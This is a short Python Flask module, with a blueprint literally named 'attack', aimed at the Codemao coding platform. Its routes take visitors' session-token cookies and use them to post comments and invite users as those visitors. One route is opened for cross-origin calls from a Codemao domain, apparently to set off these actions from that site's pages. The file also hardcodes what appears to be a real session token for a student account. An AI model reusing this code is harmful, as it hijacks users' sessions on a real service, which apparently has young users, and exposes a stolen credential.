from flask import Blueprint, request, jsonify, make_response, render_template
from .codemao import login, get_user_detail, comfirm_account, post_comment, invite_user
from flask_cors import cross_origin  # 只需要导入cross_origin
attack_creater = Blueprint('attack', __name__)


@attack_creater.route('/dom/post/more/<int:pid>',methods=['GET'])
def attack_dom_post(pid):
    active = comfirm_account(request.cookies.get('token'))
    if active == 'succ':
        post_comment(pid,request.cookies.get('token'))
        return jsonify({'active':'successful'})
    else:
      return jsonify({'active':'failed','msg':active})

info_list = {'clsid':1240096,'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDb2RlbWFvIEF1dGgiLCJ1c2VyX3R5cGUiOiJzdHVkZW50IiwiZGV2aWNlX2lkIjowLCJ1c2VyX2lkIjoxNDU4NjI5OTAxLCJpc3MiOiJBdXRoIFNlcnZpY2UiLCJwaWQiOiI2NWVkQ1R5ZyIsImV4cCI6MTczMTQwMzY3NywiaWF0IjoxNzI3NTE1Njc3LCJqdGkiOiI3MDkzNDAxZi1mOTA5LTQ1MGItYTZkYy1hYTQxMTFjYmY0MDkifQ.yvjWvyoRvBz1OwgQQmMkHnV1gmXJZu4nv-BdMuek2Hc'}
@attack_creater.route('/class/info')
def get_info():
    return jsonify(info_list)

@attack_creater.route('/class/info/edit/')
def edit_info():
    info_list = {'clsid':int(request.args.get('clsid')),'token':str(request.args.get('token'))}
    return jsonify(info_list)

@attack_creater.route('/invite')
@cross_origin(origin='https://coco.codemao.cn/')  # 在路由级别启用跨域支持
def invite():
    invite_user(request.args.get('username'))
    return jsonify({'active':'successful'})
